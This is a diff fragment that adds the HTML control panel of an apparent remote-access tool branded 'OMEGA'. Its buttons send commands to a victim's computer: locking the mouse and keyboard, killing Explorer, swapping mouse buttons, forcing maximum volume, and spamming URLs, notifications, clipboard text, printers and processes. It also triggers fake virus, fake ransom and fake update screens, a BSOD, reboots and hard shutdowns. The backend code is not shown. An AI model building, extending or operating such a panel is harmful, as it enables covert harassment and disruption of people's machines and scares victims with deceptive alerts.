+                            <button class="btn btn-ghost" onclick="sendTroll('screen_flash',{count:10})" style="justify-content:center">⚡ Screen Flash ×10</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('night_light')" style="justify-content:center">🌙 Night Light</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('wallpaper_slideshow')" style="justify-content:center">🖼 Wallpaper Slideshow</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('wallpaper_slideshow_stop')" style="justify-content:center">⏹ Stop Slideshow</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('screenshot_flood',{count:20,delay:0.3})" style="justify-content:center;color:var(--accent-violet)">📸 SS Flood ×20</button>
+                        </div>
+                    </div>
+
+                    <!-- ── SYSTEM CHAOS ── -->
+                    <div class="v22-section">
+                        <div class="v22-section-title">🎭 System Chaos</div>
+                        <div class="troll-grid-v22">
+                            <button class="btn btn-ghost" id="btn-chaos" onclick="toggleChaos()" style="justify-content:center">🌀 Chaos Mouse</button>
+                            <button class="btn btn-ghost" id="btn-drag-chaos" onclick="toggleDragChaos()" style="justify-content:center">🪟 Drag Chaos</button>
+                            <button class="btn btn-ghost" onclick="flipScreen(180)" style="justify-content:center">🔄 Flip Screen</button>
+                            <button class="btn btn-ghost" onclick="flipScreen(0)" style="justify-content:center">🔄 Restore Screen</button>
+                            <button class="btn btn-ghost" onclick="ejectCD()" style="justify-content:center">💿 Eject CD</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('eject_cd_spam',{count:8})" style="justify-content:center">💿💿 CD Spam ×8</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('swap_mouse')" style="justify-content:center;color:var(--accent-amber)">🖱 Swap Mouse Buttons</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('sticky_keys')" style="justify-content:center">⌨ StickyKeys Grief</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('high_contrast')" style="justify-content:center">♿ High Contrast</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('hide_taskbar')" style="justify-content:center">📍 Hide Taskbar</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('show_taskbar')" style="justify-content:center">📍 Show Taskbar</button>
+                            <button class="btn btn-ghost" onclick="sendFakeUpdate()" style="color:var(--accent-amber);border-color:var(--accent-amber);justify-content:center">🪟 Fake Update</button>
+                            <button class="btn btn-ghost" onclick="killExplorer()" style="color:var(--accent-red);justify-content:center">💀 Kill Explorer</button>
+                            <button class="btn btn-ghost" onclick="startExplorer()" style="justify-content:center">▶ Start Explorer</button>
+                            <button class="btn btn-ghost" onclick="hideIcons()" style="justify-content:center">🙈 Hide Icons</button>
+                            <button class="btn btn-ghost" onclick="showIcons()" style="justify-content:center">👁 Show Icons</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('beep_pattern')" style="justify-content:center">🔔 Beep Pattern</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('maximize_all')" style="justify-content:center">⬜ Minimize All</button>
+                        </div>
+                    </div>
+
+                    <!-- ── AUDIO WARFARE ── -->
+                    <div class="v22-section">
+                        <div class="v22-section-title">🔊 Audio Warfare</div>
+                        <div class="troll-grid-v22">
+                            <button class="btn btn-ghost" onclick="sendTroll('audio_max')" style="justify-content:center;color:var(--accent-red)">🔊 MAX VOLUME</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('audio_mute')" style="justify-content:center">🔇 Mute</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('audio_unmute')" style="justify-content:center">🔈 Unmute</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('beep_pattern')" style="justify-content:center">🎵 System Beep</button>
+                        </div>
+                    </div>
+
+                    <!-- ── SOCIAL ENGINEERING OVERLAYS ── -->
+                    <div class="v22-section">
+                        <div class="v22-section-title">🎭 Social Engineering Overlays</div>
+                        <div class="troll-grid-v22">
+                            <button class="btn btn-ghost" onclick="sendTroll('fake_virus')" style="justify-content:center;color:var(--accent-red);border-color:var(--accent-red)">☣ Fake Virus Scan</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('fake_activation')" style="justify-content:center;color:var(--accent-amber)">🔑 Fake Activation</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('fakeransom')" style="color:var(--accent-amber);border-color:var(--accent-amber);justify-content:center">💀 Fake Ransom</button>
+                            <button class="btn btn-ghost" onclick="startJumpscare()" style="background:var(--accent-red);color:#fff;border:none;justify-content:center;font-weight:700">👹 JUMPSCARE</button>
+                            <button class="btn btn-ghost" onclick="stopJumpscare()" style="justify-content:center">✕ Stop Jumpscare</button>
+                        </div>
+                        <div style="margin-top:10px;display:grid;grid-template-columns:1fr 1fr;gap:8px">
+                            <div>
+                                <label style="font-size:0.75rem;color:var(--text-muted)">Jumpscare image URL</label>
+                                <input type="text" id="jsImgInput" class="file-path-input" style="width:100%;margin-top:3px;font-size:0.75rem" placeholder="GIF / JPG URL…">
+                            </div>
+                            <div>
+                                <label style="font-size:0.75rem;color:var(--text-muted)">Jumpscare audio URL</label>
+                                <input type="text" id="jsSndInput" class="file-path-input" style="width:100%;margin-top:3px;font-size:0.75rem" placeholder=".mp3 URL…">
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ── NOTIFICATION / CLIPBOARD / URL SPAM ── -->
+                    <div class="v22-section">
+                        <div class="v22-section-title">📢 Spam & Popups</div>
+                        <div style="display:grid;grid-template-columns:1fr auto;gap:8px;margin-bottom:8px;align-items:end">
+                            <div>
+                                <label style="font-size:0.75rem;color:var(--text-muted)">Notification text</label>
+                                <input type="text" id="notif-text-input" class="file-path-input" style="width:100%;margin-top:3px;font-size:0.82rem" value="⚠️ Your computer has a virus!">
+                            </div>
+                            <button class="btn btn-operate" onclick="sendTroll('notification_spam',{value:$('notif-text-input').value})" style="justify-content:center;white-space:nowrap">Toast Spam</button>
+                        </div>
+                        <div style="display:grid;grid-template-columns:1fr auto;gap:8px;margin-bottom:8px;align-items:end">
+                            <div>
+                                <label style="font-size:0.75rem;color:var(--text-muted)">Clipboard spam text</label>
+                                <input type="text" id="clip-spam-input" class="file-path-input" style="width:100%;margin-top:3px;font-size:0.82rem" value="OMEGA WAS HERE 💀🔥">
+                            </div>
+                            <button class="btn btn-operate" onclick="sendTroll('clipboard_spam',{value:$('clip-spam-input').value})" style="justify-content:center;white-space:nowrap">Clip Spam</button>
+                        </div>
+                        <div style="display:grid;grid-template-columns:1fr auto auto;gap:8px;align-items:end">
+                            <div>
+                                <label style="font-size:0.75rem;color:var(--text-muted)">URL to open</label>
+                                <input type="text" id="url-spam-input" class="file-path-input" style="width:100%;margin-top:3px;font-size:0.82rem" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
+                            </div>
+                            <button class="btn btn-ghost" onclick="sendTroll('open_url',{value:$('url-spam-input').value})" style="white-space:nowrap">Open ×1</button>
+                            <button class="btn btn-operate" onclick="sendTroll('url_spam',{value:$('url-spam-input').value,count:10})" style="white-space:nowrap;color:var(--accent-red)">Spam ×10</button>
+                        </div>
+                    </div>
+
+                    <!-- ── CHAT POPUP / MESSAGE / TTS / PRINTER ── -->
+                    <div class="v22-section">
+                        <div class="v22-section-title">💬 Message & TTS</div>
+                        <div style="display:grid;grid-template-columns:1fr auto;gap:8px;margin-bottom:8px;align-items:end">
+                            <input type="text" id="trollMsgInput" class="file-path-input" style="font-size:0.82rem" placeholder="Message box text…">
+                            <button class="btn btn-operate" onclick="sendTroll('msg', $('trollMsgInput').value)" style="white-space:nowrap">Alert Box</button>
+                        </div>
+                        <div style="display:grid;grid-template-columns:1fr auto;gap:8px;margin-bottom:8px;align-items:end">
+                            <input type="text" id="trollTtsInput" class="file-path-input" style="font-size:0.82rem" placeholder="Text to speak via TTS…">
+                            <button class="btn btn-operate" onclick="sendTroll('tts', $('trollTtsInput').value)" style="white-space:nowrap">Speak TTS</button>
+                        </div>
+                        <div style="display:grid;grid-template-columns:1fr auto;gap:8px;margin-bottom:8px;align-items:end">
+                            <input type="text" id="chat-popup-input" class="file-path-input" style="font-size:0.82rem" placeholder="Chat popup message…">
+                            <button class="btn btn-operate" onclick="sendChatPopup()" style="white-space:nowrap">Pop-up</button>
+                        </div>
+                        <div style="display:grid;grid-template-columns:1fr auto;gap:8px;align-items:end">
+                            <input type="text" id="printer-text-input" class="file-path-input" style="font-size:0.82rem" placeholder="Printer spam text…">
+                            <button class="btn btn-operate" onclick="sendPrinterSpam()" style="white-space:nowrap;color:var(--accent-amber)">Print Spam</button>
+                        </div>
+                    </div>
+
+                    <!-- ── TYPE LOOP / TASK SPAM ── -->
+                    <div class="v22-section">
+                        <div class="v22-section-title">⌨ Auto-Type & Task Spawn</div>
+                        <div style="display:grid;grid-template-columns:1fr auto auto;gap:8px;margin-bottom:8px;align-items:end">
+                            <div>
+                                <label style="font-size:0.75rem;color:var(--text-muted)">Text to type in loop</label>
+                                <input type="text" id="type-loop-input" class="file-path-input" style="width:100%;margin-top:3px;font-size:0.82rem" value="OMEGA ELITE 💀 ">
+                            </div>
+                            <button class="btn btn-operate" onclick="sendTroll('type_loop',{value:$('type-loop-input').value,delay:0.04})" style="white-space:nowrap">▶ Start</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('type_loop_stop')" style="white-space:nowrap">■ Stop</button>
+                        </div>
+                        <div style="display:grid;grid-template-columns:1fr auto auto;gap:8px;align-items:end">
+                            <div>
+                                <label style="font-size:0.75rem;color:var(--text-muted)">Process to spam-launch</label>
+                                <input type="text" id="task-spam-input" class="file-path-input" style="width:100%;margin-top:3px;font-size:0.82rem" value="mspaint">
+                            </div>
+                            <input type="number" id="task-spam-count" value="8" min="1" max="15" style="width:60px;padding:6px;background:rgba(0,0,0,0.3);border:1px solid var(--border-default);color:var(--text-primary);border-radius:6px">
+                            <button class="btn btn-operate" onclick="sendTroll('task_spam',{value:$('task-spam-input').value,count:parseInt($('task-spam-count').value)})" style="white-space:nowrap;color:var(--accent-red)">Spawn</button>
+                        </div>
+                    </div>
+
+                    <!-- ── INPUT CONSTRAINTS & POWER ── -->
+                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;width:100%;align-items:start;margin-top:0.5rem">
+                        <div class="card" style="padding:1.25rem">
+                            <div style="font-weight:700;margin-bottom:1rem;color:var(--accent-amber);display:flex;align-items:center;gap:0.5rem">
+                                🔒 Input Control
+                            </div>
+                            <div style="display:grid;grid-template-columns:1fr 1fr;gap:0.6rem">
+                                <button class="btn btn-ctrl" onclick="sendMNK('mouse',true)" style="justify-content:center;height:36px">🖱 Mouse Lock</button>
+                                <button class="btn btn-ctrl" onclick="sendMNK('mouse',false)" style="justify-content:center;height:36px">🖱 Release</button>
+                                <button class="btn btn-ctrl" onclick="sendMNK('keyboard',true)" style="justify-content:center;height:36px">⌨ KB Lock</button>
+                                <button class="btn btn-ctrl" onclick="sendMNK('keyboard',false)" style="justify-content:center;height:36px">⌨ Release</button>
+                                <button class="btn btn-ghost" onclick="sendTroll('cursorlock')" style="justify-content:center">🎯 Cursor Lock</button>
+                                <button class="btn btn-ghost" onclick="sendTroll('cursorunlock')" style="justify-content:center">↩ Cursor Free</button>
+                            </div>
+                        </div>
+                        <div class="card" style="padding:1.25rem;border-color:rgba(255,0,0,0.3)">
+                            <div style="font-weight:700;margin-bottom:1rem;color:var(--accent-red);display:flex;align-items:center;gap:0.5rem">
+                                ☠ Power & Nuke
+                            </div>
+                            <div style="display:grid;grid-template-columns:1fr 1fr;gap:0.6rem">
+                                <button class="btn btn-ghost" onclick="sendTroll('minimizeall')" style="justify-content:center">⬜ Min All</button>
+                                <button class="btn btn-ghost" onclick="sendTroll('bsod')" style="background:var(--accent-blue);color:#fff;border:none;justify-content:center">💙 BSOD</button>
+                                <button class="btn btn-ghost" onclick="sendTroll('reboot')" style="color:var(--accent-amber);border-color:var(--accent-amber);justify-content:center">🔁 Reboot</button>
+                                <button class="btn btn-ghost" onclick="sendTroll('logoff')" style="justify-content:center">🚪 Log Off</button>
+                                <button class="btn btn-ghost" colspan="2" style="grid-column:1/-1;color:var(--accent-red);border-color:var(--accent-red);justify-content:center" onclick="if(confirm('HARD SHUTDOWN — confirm?')) sendTroll('shutdown')">⚡ HARD SHUTDOWN</button>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+
+            </div><!-- /modal-view-area -->
+        </div><!-- /modal-layout -->
+    </div><!-- /modal-content -->
+</div><!-- /remoteModal -->
+
+<script src="/static/script.js"></script>
 </body>
 </html>
